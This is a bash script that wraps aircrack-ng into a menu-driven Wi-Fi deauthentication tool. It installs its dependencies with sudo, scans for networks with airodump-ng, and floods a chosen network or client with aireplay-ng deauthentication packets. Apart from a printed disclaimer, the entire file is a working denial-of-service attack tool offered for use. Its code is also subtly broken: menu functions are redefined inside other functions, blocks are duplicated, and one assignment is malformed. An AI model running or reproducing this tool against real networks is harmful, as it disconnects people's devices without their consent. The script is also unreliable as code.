#!/bin/bash

#List of prerequisite tools
required_tools=("lolcat" "toilet" "aircrack-ng")

# Function to check if a tool is installed
check_tool(){
  command -v "$1" >/dev/null 2>&1
}

# Function to download and install a tool
install_tool() {
    tool_name="$1"
    
    # Detect Linux distribution
    linux_distribution=$(awk -F= '/^ID=/{print $2}' /etc/os-release)
    
    case "$linux_distribution" in
        debian|ubuntu)
            package_manager="apt"
            ;;
        fedora)
            package_manager="dnf"
            ;;
        arch)
            package_manager="pacman"
            ;;
        centos|rhel)
            package_manager="yum"
            ;;
        *)
            echo "Unsupported Linux distribution: $linux_distribution. Please install $tool_name manually."
            exit 1
            ;;
    esac

    echo "Detected Linux distribution: $linux_distribution"
    echo "Installing $tool_name with $package_manager..."

    # Install the tool using the appropriate package manager
    case "$package_manager" in
        apt)
            sudo apt-get update
            download_command="sudo apt-get install -y $tool_name"
            ;;
        dnf)
            download_command="sudo dnf install -y $tool_name"
            ;;
        pacman)
            download_command="sudo pacman -S --noconfirm $tool_name"
            ;;
        yum)
            download_command="sudo yum install -y $tool_name"
            ;;
        *)
            echo "Unsupported package manager: $package_manager. Please install $tool_name manually."
            exit 1
            ;;
    esac

    echo "Installing $tool_name with $package_manager..."
    eval "$download_command"

# Check if installation was successful
    if check_tool "$tool_name"; then
        echo "$tool_name installed successfully."
    else
        echo "Failed to install $tool_name. Please install it manually."
        exit 1
    fi
}
for tool in "${required_tools[@]}"; do
    if ! check_tool "$tool"; then
        install_tool "$tool"
    
    fi
done

# Starting animation
width=$(tput cols)
echo "D34uthwiFI" | toilet -f mono12 -F border -F metal -t -w "$width" | lolcat;
echo


display_menu() {
    echo "------------------------------------" | lolcat
    echo "Wi-Fi Deauthentication Tool" | lolcat
    echo "1. Scan for Wi-Fi networks                           2. Select a Wi-Fi network" | lolcat
    echo "3. Deauthenticate a client from a Wi-Fi network      4. Deauthenticate all clients from a Wi-Fi network" | lolcat              
    echo "5. Check Wi-Fi Adapter Status                        6. Change Wi-Fi Adapter Interface Name" | lolcat
    echo "7. Exit" | lolcat
    echo "" | lolcat
    echo "Enter your choice:" | lolcat
    read choice
}

scan_wifi() {

# Function to display menu
display_menu() {
    echo "Select a network interface:" | lolcat
    local i=1
    for interface in "${interfaces[@]}"; do
        echo "$i. $interface" | lolcat
        ((i++))
    done
    echo "0. Exit" | lolcat
}

# Function to read user input and validate
read_input() {
    read -rp "Enter your choice: " choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid input. Please enter a number." | lolcat
        read_input
    fi
    if ((choice < 0 || choice > ${#interfaces[@]})); then
        echo "Error: Invalid choice. Please enter a valid option." | lolcat
        read_input
    fi
}

# Main script
interfaces=($(ls /sys/class/net))

if [ ${#interfaces[@]} -eq 0 ]; then
    echo "No network interfaces found." | lolcat
    exit 1
fi

display_menu
read_input

if ((choice == 0)); then
    echo "Exiting." | lolcat
    exit 0
fi

wifi_interface="${interfaces[choice-1]}"
echo "You have chosen interface: $wifi_interface" | lolcat
# Further actions with chosen interface can be added here


    echo "Scanning for Wi-Fi networks..." | lolcat
    airodump-ng $wifi_interface
}
#--------------------------------------------------------------------------------------
select_wifi() {
    echo "Enter the BSSID of the Wi-Fi network:" | lolcat
    read wifi_bssid
    echo "Enter the channel of the Wi-Fi network:" | lolcat
    read channel
    




   display_menu() {
    echo "Select a network interface:" | lolcat
    local i=1
    for interface in "${interfaces[@]}"; do
        echo "$i. $interface" | lolcat
        ((i++))
    done
    echo "0. Exit" | lolcat
}

# Function to read user input and validate
read_input() {
    read -rp "Enter your choice: " choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid input. Please enter a number." | lolcat
        read_input
    fi
    if ((choice < 0 || choice > ${#interfaces[@]})); then
        echo "Error: Invalid choice. Please enter a valid option." | lolcat
        read_input
    fi
}

# Main script
interfaces=($(ls /sys/class/net))

if [ ${#interfaces[@]} -eq 0 ]; then
    echo "No network interfaces found." | lolcat
    exit 1
fi

display_menu
read_input

if ((choice == 0)); then
    echo "Exiting." | lolcat
    exit 0
fi

wifi_interface="${interfaces[choice-1]}"
echo "You have chosen interface: $wifi_interface" | lolcat


    echo "Starting monitoring on the selected network..." | lolcat
    airodump-ng --bssid $wifi_bssid --channel $channel $wifi_interface
}
#---------------------------------------------------------------------------------------------------------
deauth_client() {
    echo "Enter the number of deauthentication packets to send:" | lolcat
    read deauth_packets
    echo "Enter the BSSID of the Wi-Fi network:" | lolcat
    read wifi_bssid
    echo "Enter the client MAC address to deauthenticate:" | lolcat
    read client_mac
    echo "Sending deauthentication packets..." | lolcat

    display_menu() {
    echo "Select a network interface:" | lolcat
    local i=1
    for interface in "${interfaces[@]}"; do
        echo "$i. $interface" | lolcat
        ((i++))
    done
    echo "0. Exit" | lolcat
}

# Function to read user input and validate
read_input() {
    read -rp "Enter your choice: " choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid input. Please enter a number." | lolcat
        read_input
    fi
    if ((choice < 0 || choice > ${#interfaces[@]})); then
        echo "Error: Invalid choice. Please enter a valid option." | lolcat
        read_input
    fi
}

# Main script
interfaces=($(ls /sys/class/net))

if [ ${#interfaces[@]} -eq 0 ]; then
    echo "No network interfaces found." | lolcat
    exit 1
fi

display_menu
read_input

if ((choice == 0)); then
    echo "Exiting." | lolcat
    exit 0
fi

wifi_interface="${interfaces[choice-1]}"
echo "You have chosen interface: $wifi_interface" | lolcat

    aireplay-ng -0  $deauth_packets -a $wifi_bssid -c $client_mac $wifi_interface
}

#-----------------------------------------------------------------------------------------------------

deauth_all_clients() {
    echo "Enter the number of deauthentication packets to send:" | lolcat
    read deauth_packets
    echo "Enter the BSSID of the Wi-Fi network:" | lolcat
    read wifi_bssid
    echo "Enter the Channel id"
    read wifi_channel
    echo "Sending deauthentication packets to all clients..." | lolcat

       display_menu() {
    echo "Select a network interface:" | lolcat
    local i=1
    for interface in "${interfaces[@]}"; do
        echo "$i. $interface" | lolcat
        ((i++))
    done
    echo "0. Exit" | lolcat
}

# Function to read user input and validate
read_input() {
    read -rp "Enter your choice: " choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid input. Please enter a number." | lolcat
        read_input
    fi
    if ((choice < 0 || choice > ${#interfaces[@]})); then
        echo "Error: Invalid choice. Please enter a valid option." | lolcat
        read_input
    fi
}

# Main script
interfaces=($(ls /sys/class/net))

if [ ${#interfaces[@]} -eq 0 ]; then
    echo "No network interfaces found." | lolcat
    exit 1
fi

display_menu
read_input

if ((choice == 0)); then
    echo "Exiting." | lolcat
    exit 0
fi

wifi_interface="${interfaces[choice-1]}"
echo "You have chosen interface: $wifi_interface" | lolcat

    aireplay-ng --deauth $deauth_packets  -a $wifi_bssid $wifi_interface
}

#----------------------------------------------------------------------------------------------------------------

check_wifi() {
    echo "Wi-Fi Adapter Status" | lolcat
    iwconfig $wifi_interface
}

change_interface() {
    echo "Enter the new Wi-Fi adapter interface name:" | lolcat
    read new_interface
    wifi_interface=$new_interface
    echo "Wi-Fi adapter interface name changed to $wifi_interface." | lolcat
}

echo "This tool is created by MD Faisal Jaman" | lolcat

echo "" | lolcat

echo "Summary of Disclaimer:" | lolcat
echo "1. For educational purposes only. Do not engage in illegal activities." | lolcat
echo "2. Use only for legitimate penetration testing and with permission." | lolcat
echo "3. Agree not to engage in unauthorized or illegal activities." | lolcat
echo "4. Author not responsible for damages caused by misuse." | lolcat
echo "5. Use at your own risk, ensure compliance with laws and permissions." | lolcat

echo "" | lolcat

read -p "Press any key to continue..." | lolcat

wifi_interface= $wifi_interface

while true; do
    display_menu

    case $choice in
        1)
            scan_wifi
            ;;
        2)
            select_wifi
            ;;
        3)
            deauth_client
            ;;
        4)
            deauth_all_clients
            ;;
        5)
            check_wifi
            ;;
        6)
            change_interface
            ;;
        7)
            echo "Exiting..." | lolcat
            break
            ;;
        *)
            echo "Invalid choice. Please try again." | lolcat
            ;;
    esac

    read -p "Do you want to continue? (yes/no): " continue_choice
    if [ "$continue_choice" != "yes" ]; then
        echo "Terminating......Thank you for using this Tool." | lolcat
        break
    fi

    echo | lolcat
done
